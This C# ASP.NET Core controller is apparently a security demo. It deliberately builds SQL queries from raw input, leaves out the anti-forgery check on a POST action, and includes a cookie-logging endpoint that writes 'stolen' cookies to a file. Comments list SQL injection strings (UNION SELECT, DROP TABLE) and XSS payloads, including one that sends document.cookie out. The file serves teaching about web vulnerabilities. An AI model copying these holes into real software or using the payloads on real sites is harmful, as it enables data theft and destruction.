namespace AspNetCoreSecurityDemo.Controllers
{
    using System;
    using System.Data.SqlClient;
    using System.IO;
    using System.Threading.Tasks;

    using AspNetCoreSecurityDemo.Data;

    using Microsoft.AspNetCore.Http;
    using Microsoft.AspNetCore.Mvc;

    public class SecurityController : Controller
    {
        private readonly ApplicationDbContext dbContext;

        private readonly IHttpContextAccessor httpContextAccessor;

        public SecurityController(
            ApplicationDbContext dbContext,
            IHttpContextAccessor httpContextAccessor)
        {
            this.dbContext = dbContext;
            this.httpContextAccessor = httpContextAccessor;
        }

        public IActionResult SqlInjection()
        {
            return this.View();
        }

        // '
        // ' --
        // UNION SELECT * FROM SensitiveDataTable
        // '; INSERT INTO [DataValues]([Name], [Value]) VALUES('HackedName', 'HackedValue'); --
        // '; DROP TABLE [DataValues]; --
        public IActionResult Search(string searchText)
        {
            // Same for Dapper
            using (var connection = new SqlConnection("Server=.;Database=AspNetCoreSecurityDemo;Integrated Security=True"))
            {
                connection.Open();
                var command = new SqlCommand($"SELECT * FROM [DataValues] WHERE [Name] LIKE '%{searchText}%'", connection);

                //// var command = new SqlCommand($"SELECT * FROM [DataValues] WHERE [Name] LIKE '%@textToSearch%'", connection);
                //// command.Parameters.AddWithValue("@textToSearch", searchText);

                //// this.dbContext.Database.ExecuteSqlCommand()

                using (var reader = command.ExecuteReader())
                {
                    if (reader.Read())
                    {
                        var returnString = $"Name: {reader["Name"]}. Value: {reader["Value"]}";
                        return this.Content(returnString);
                    }
                    else
                    {
                        return this.Content("Nothing found.");
                    }
                }
            }
        }

        // <a href='https://google.com'>click me</a>
        // <script>alert('hacked!');</script> => ERR_BLOCKED_BY_XSS_AUDITOR => try Edge
        // <script>var img = new Image(0,0); img.src='https://localhost:44337/Security/SomeImage?c=' + document.cookie; document.body.appendChild(img);</script>
        // <img src='x' onerror="alert('XSS');">
        // https://github.com/mganss/HtmlSanitizer/blob/master/test/HtmlSanitizer.Tests/Tests.cs
        public IActionResult CrossSiteScripting(string searchText)
        {
            this.HttpContext.Response.Cookies.Append("myImportantCookie", "myImportantCookieValue");
            return this.View((object)searchText);
        }

        public IActionResult SomeImage(string c)
        {
            if (!Directory.Exists("C:/Temp"))
            {
                Directory.CreateDirectory("C:/Temp");
            }

            System.IO.File.AppendAllText(
                "C:/Temp/stolenCookies.txt",
                string.Format("[{0}] {1}{2}", this.httpContextAccessor.HttpContext.Connection.RemoteIpAddress, c, Environment.NewLine));

            return this.Content(c);
        }

        public IActionResult CrossSiteRequestForgery()
        {
            if (this.HttpContext.Request.Cookies["myImportantCookie"] != "myImportantCookieValue")
            {
                return this.Unauthorized();
            }

            return this.View();
        }

        [HttpPost]
        //// [ValidateAntiForgeryToken]
        // https://docs.microsoft.com/en-us/aspnet/core/security/anti-request-forgery?view=aspnetcore-2.1
        public async Task<IActionResult> CreateDataValue(string name, string value)
        {
            if (this.HttpContext.Request.Cookies["myImportantCookie"] != "myImportantCookieValue")
            {
                return this.Unauthorized();
            }

            this.dbContext.DataValues.Add(new DataValue { Name = name, Value = value });
            await this.dbContext.SaveChangesAsync();
            return this.RedirectToAction("CrossSiteRequestForgery");
        }
    }
}
